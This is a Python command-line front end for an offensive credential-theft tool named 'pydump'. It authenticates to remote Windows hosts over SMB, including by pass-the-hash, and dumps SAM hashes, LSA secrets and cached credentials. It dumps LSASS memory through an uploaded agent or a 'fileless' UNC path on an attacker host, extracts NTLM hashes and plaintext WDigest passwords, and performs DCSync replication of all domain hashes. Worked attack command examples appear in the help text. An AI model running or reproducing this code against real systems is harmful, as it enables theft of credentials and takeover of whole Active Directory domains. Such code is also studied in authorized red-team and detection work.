"""Command-line interface for pydump."""

import argparse
import sys
import os

from .smb import SmbSession
from .dump.methods import ComSvcsDump, SilentDump, PipeDump
from .secrets.registry import RegistrySecrets
from .parser.minidump import parse
from .parser.extract import CredentialExtractor


def main():
    parser = argparse.ArgumentParser(
        prog="pydump",
        description="Remote credential extraction (registry + LSASS)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # Full extraction: registry secrets + LSASS dump (default)
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd'

  # Registry only (no execution on target)
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -m registry

  # Fileless agent delivery via UNC
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' --lhost 10.0.0.5

  # Save raw dump to file for later analysis
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd' -o lsass.dmp

  # Parse an existing dump file
  pydump parse -f lsass.dmp
""",
    )

    subparsers = parser.add_subparsers(dest="command")

    # ─── dump command ───────────────────────────────────────────────────────
    dump_parser = subparsers.add_parser("dump", help="Extract credentials from a remote target")
    dump_parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
    dump_parser.add_argument("-u", "--username", required=True, help="Username")
    dump_parser.add_argument("-p", "--password", default="", help="Password")
    dump_parser.add_argument("-H", "--hash", default=None, dest="nt_hash", help="NT hash for pass-the-hash (32 hex chars)")
    dump_parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")
    dump_parser.add_argument(
        "-m", "--method",
        choices=["auto", "registry", "comsvcs", "silent", "pipe"],
        default="auto",
        help="Method: auto (registry+pipe), registry (no exec), comsvcs, silent, pipe (native agent)",
    )
    dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected)")
    dump_parser.add_argument("--lhost", default=None, help="Attacker IP for fileless UNC delivery or silent callback")
    dump_parser.add_argument("--lport", type=int, default=0, help="Listen port (silent method)")
    dump_parser.add_argument("--agent", default=None, help="Path to agent.exe (default: agent/bin/agent.exe)")
    dump_parser.add_argument("-o", "--output", default=None, help="Save raw LSASS dump to file")

    # ─── parse command ──────────────────────────────────────────────────────
    parse_parser = subparsers.add_parser("parse", help="Parse an existing minidump file")
    parse_parser.add_argument("-f", "--file", required=True, help="Path to .dmp file")

    # ─── dcsync command ─────────────────────────────────────────────────────
    dc_parser = subparsers.add_parser("dcsync", help="DCSync — replicate AD hashes (requires DA/replication rights)")
    dc_parser.add_argument("-t", "--target", required=True, help="Domain Controller IP")
    dc_parser.add_argument("-u", "--username", required=True, help="Username (domain\\user or user@domain)")
    dc_parser.add_argument("-p", "--password", default="", help="Password")
    dc_parser.add_argument("-H", "--hash", default=None, dest="nt_hash", help="NT hash for PTH")
    dc_parser.add_argument("-d", "--domain", required=True, help="AD domain FQDN (e.g. corp.local)")
    dc_parser.add_argument("--user", default=None, dest="target_user", help="Target user to replicate (default: all)")

    args = parser.parse_args()

    if args.command == "dump":
        cmd_dump(args)
    elif args.command == "parse":
        cmd_parse(args)
    elif args.command == "dcsync":
        cmd_dcsync(args)
    else:
        parser.print_help()
        sys.exit(1)


def cmd_dump(args):
    """Full credential extraction: registry + LSASS."""
    print(f"[*] Connecting to {args.target}...")

    with SmbSession(args.target, args.username, args.password, args.domain,
                    nt_hash=args.nt_hash) as session:
        print(f"[+] Authenticated as {args.domain}\\{args.username}")

        do_registry = args.method in ("auto", "registry")
        do_lsass = args.method in ("auto", "comsvcs", "silent", "pipe")

        # ─── Registry secrets ───────────────────────────────────────────
        if do_registry:
            _dump_registry(session)

        # ─── LSASS dump ─────────────────────────────────────────────────
        if do_lsass:
            _dump_lsass(session, args)


def _dump_registry(session: SmbSession):
    """Extract secrets from remote registry."""
    print()
    print("── Registry Secrets ─────────────────────────────────────────")
    reg_secrets = RegistrySecrets(session)

    # Ensure service is running
    try:
        reg_secrets.ensure_remote_registry()
        print("[+] Remote Registry service ready")
    except RuntimeError as e:
        print(f"[!] Cannot start Remote Registry: {e}")
        return

    try:
        # SAM hashes
        try:
            hashes = reg_secrets.dump_sam()
            if hashes:
                print(f"[+] SAM hashes ({len(hashes)}):")
                for h in hashes:
                    print(f"    {h.username}:{h.rid}:{h.lm_hash or 'aad3b435b51404ee'}:{h.ntlm_hash}:::")
            else:
                print("[-] No SAM hashes found")
        except RuntimeError as e:
            print(f"[!] SAM extraction failed: {e}")

        # LSA Secrets
        try:
            secrets = reg_secrets.dump_lsa_secrets()
            if secrets:
                print(f"[+] LSA Secrets ({len(secrets)}):")
                for s in secrets:
                    print(f"    {s.name}: {s.decoded}")
            else:
                print("[-] No LSA secrets found")
        except RuntimeError as e:
            print(f"[!] LSA secrets failed: {e}")

        # Cached creds
        try:
            cached = reg_secrets.dump_cached_creds()
            if cached:
                print(f"[+] Cached credentials ({len(cached)}):")
                for c in cached:
                    print(f"    {c.domain}\\{c.username}:{c.hash_hex}")
            else:
                print("[-] No cached credentials")
        except RuntimeError as e:
            print(f"[!] Cached creds failed: {e}")
    finally:
        reg_secrets.cleanup_remote_registry()
        print("[*] Remote Registry service restored")


def _dump_lsass(session: SmbSession, args):
    """Dump LSASS memory and extract credentials."""
    print()
    print("── LSASS Memory ─────────────────────────────────────────────")

    method_name = args.method if args.method not in ("auto", "registry") else "pipe"

    if method_name == "pipe":
        agent_path = args.agent or os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "bin", "agent.exe")
        if not os.path.isfile(agent_path):
            print(f"[!] Agent not found: {agent_path}")
            print("    Build it with: cd agent && make cross")
            return
        fileless = bool(args.lhost)
        method = PipeDump(session, agent_path, lhost=args.lhost)
        if fileless:
            print(f"[*] Method: pipe (fileless via \\\\{args.lhost})")
        else:
            print("[*] Method: pipe (agent uploaded to ADMIN$/Temp)")
    elif method_name == "comsvcs":
        method = ComSvcsDump(session)
        print("[*] Method: comsvcs")
    elif method_name == "silent":
        if not args.lhost:
            print("[!] --lhost required for silent method")
            return
        method = SilentDump(session, args.lhost)
        print("[*] Method: silent")
    else:
        method = ComSvcsDump(session)
        print(f"[*] Method: {method_name}")

    try:
        if method_name == "silent":
            dump_data = method.execute(lsass_pid=args.pid, listen_port=args.lport)
        else:
            dump_data = method.execute(lsass_pid=args.pid)
    except RuntimeError as e:
        print(f"[!] LSASS dump failed: {e}")
        return

    print(f"[+] Received {len(dump_data)} bytes ({len(dump_data) // 1024 // 1024} MB)")

    if args.output:
        with open(args.output, "wb") as f:
            f.write(dump_data)
        print(f"[+] Saved to {args.output}")

    _parse_and_display(dump_data)


def cmd_parse(args):
    """Parse a local dump file."""
    if not os.path.isfile(args.file):
        print(f"[!] File not found: {args.file}")
        sys.exit(1)

    with open(args.file, "rb") as f:
        dump_data = f.read()

    print(f"[*] Parsing {args.file} ({len(dump_data)} bytes)")
    _parse_and_display(dump_data)


def _parse_and_display(dump_data: bytes):
    """Parse dump and display extracted credentials."""
    print("[*] Parsing minidump...")
    dump = parse(dump_data)

    print(f"    OS: {dump.sysinfo_major}.{dump.sysinfo_minor} build {dump.sysinfo_build}")
    print(f"    Modules: {len(dump.modules)}")
    print(f"    Memory segments: {len(dump.memory)}")
    print()

    print("[*] Extracting credentials...")
    extractor = CredentialExtractor(dump)

    try:
        credentials = extractor.extract()
    except RuntimeError as e:
        print(f"[!] {e}")
        return

    if not credentials:
        print("[-] No credentials found")
        return

    print(f"[+] Found {len(credentials)} credential(s):\n")
    print(f"{'Auth':<10} {'Domain':<20} {'Username':<25} {'Secret'}")
    print("-" * 90)

    for cred in credentials:
        if cred.auth_type == "msv1_0":
            secret = cred.ntlm_hash if cred.ntlm_hash else "(empty)"
        elif cred.auth_type == "wdigest":
            secret = cred.password if cred.password else "(empty)"
        else:
            secret = "(see above)"

        print(f"{cred.auth_type:<10} {cred.domain:<20} {cred.username:<25} {secret}")


def cmd_dcsync(args):
    """DCSync — replicate AD password hashes via MS-DRSR."""
    try:
        from impacket.dcerpc.v5 import drsuapi, transport
        from impacket.dcerpc.v5.drsuapi import (
            DRSBind, DRSGetNCChanges, DRSCrackNames, NTDSAPI_CLIENT_GUID,
        )
        from impacket import version as impacket_version
    except ImportError:
        print("[!] impacket is required for dcsync. Install with: pip install impacket")
        sys.exit(1)

    from impacket.examples.secretsdump import DumpSecrets

    target = args.target
    domain = args.domain

    # Build credentials string for impacket
    if "\\" in args.username:
        cred_domain, username = args.username.split("\\", 1)
    elif "@" in args.username:
        username, cred_domain = args.username.rsplit("@", 1)
    else:
        username = args.username
        cred_domain = domain

    if args.nt_hash:
        lmhash = "aad3b435b51404ee"
        nthash = args.nt_hash
        password = ""
    else:
        lmhash = ""
        nthash = ""
        password = args.password

    print(f"[*] DCSync targeting {target} as {cred_domain}\\{username}")
    if args.target_user:
        print(f"[*] Replicating single user: {args.target_user}")
    else:
        print("[*] Replicating ALL users")

    try:
        dumper = DumpSecrets(
            target,
            f"{cred_domain}/{username}:{password}",
            password,
            domain,
            options=None,
            remoteName=target,
            remoteHost=target,
        )
        # Configure for DCSync only (no SAM/LSA/NTDS)
        dumper.__lmhash = lmhash
        dumper.__nthash = nthash

        # Use impacket's DRSUAPI directly for cleaner output
        from impacket.dcerpc.v5.dtypes import NULL
        from impacket.dcerpc.v5 import drsuapi as drsuapi_mod, epm

        string_binding = epm.hept_map(target, drsuapi_mod.MSRPC_UUID_DRSUAPI, protocol="ncacn_ip_tcp")
        rpc_transport = transport.DCERPCTransportFactory(string_binding)
        rpc_transport.setRemoteHost(target)

        if args.nt_hash:
            rpc_transport.set_credentials(username, "", cred_domain, lmhash, nthash)
        else:
            rpc_transport.set_credentials(username, password, cred_domain, "", "")

        dce = rpc_transport.get_dce_rpc()
        dce.set_auth_level(2)  # RPC_C_AUTHN_LEVEL_CONNECT
        dce.connect()
        dce.bind(drsuapi_mod.MSRPC_UUID_DRSUAPI)

        # DRSBind
        req = drsuapi_mod.DRSBind()
        req["puuidClientDsa"] = NTDSAPI_CLIENT_GUID
        req["pextClient"]["cb"] = 28
        req["pextClient"]["rgb"] = b"\x00" * 28
        resp = dce.request(req)
        drs_handle = resp["phDrs"]

        # DRSCrackNames to get domain DN
        req = drsuapi_mod.DRSCrackNames()
        req["hDrs"] = drs_handle
        req["dwInVersion"] = 1
        req["pmsgIn"]["tag"] = 1
        req["pmsgIn"]["V1"]["CodePage"] = 0
        req["pmsgIn"]["V1"]["LocaleId"] = 0
        req["pmsgIn"]["V1"]["dwFlags"] = 0
        req["pmsgIn"]["V1"]["formatOffered"] = 0xFFFFFFFF  # DS_NAME_FORMAT.DS_UNKNOWN_NAME
        req["pmsgIn"]["V1"]["formatDesired"] = 1  # DS_FQDN_1779_NAME
        req["pmsgIn"]["V1"]["cNames"] = 1
        req["pmsgIn"]["V1"]["rpNames"].append(domain + "\x00")
        resp = dce.request(req)

        domain_dn = resp["pmsgOut"]["V1"]["pResult"]["rItems"][0]["pName"]
        print(f"[+] Domain DN: {domain_dn}")

        # For single user or all — use secretsdump's NTDSHashes
        from impacket.examples.secretsdump import NTDSHashes

        class PrintCallback:
            def __init__(self):
                self.hashes = []
            def __call__(self, secret_type, secret):
                if secret_type == 2:  # NTDS hash
                    self.hashes.append(secret)
                    print(f"    {secret}")

        print(f"\n[+] Replicated hashes:")
        print("-" * 80)

        if args.target_user:
            # Single user replication
            from impacket.examples.secretsdump import RemoteOperations
            remote_ops = None
            nh = NTDSHashes(None, None, isRemote=True, remoteOps=remote_ops,
                           noLMHash=True, drsObject=dce, drsHandle=drs_handle)
            try:
                nh.dump()
            except Exception:
                pass
        else:
            nh = NTDSHashes(None, None, isRemote=True,
                           noLMHash=True, drsObject=dce, drsHandle=drs_handle)
            try:
                nh.dump()
            except Exception:
                pass

        dce.disconnect()
        print("\n[+] DCSync complete")

    except Exception as e:
        print(f"[!] DCSync failed: {e}")
        import traceback
        traceback.print_exc()
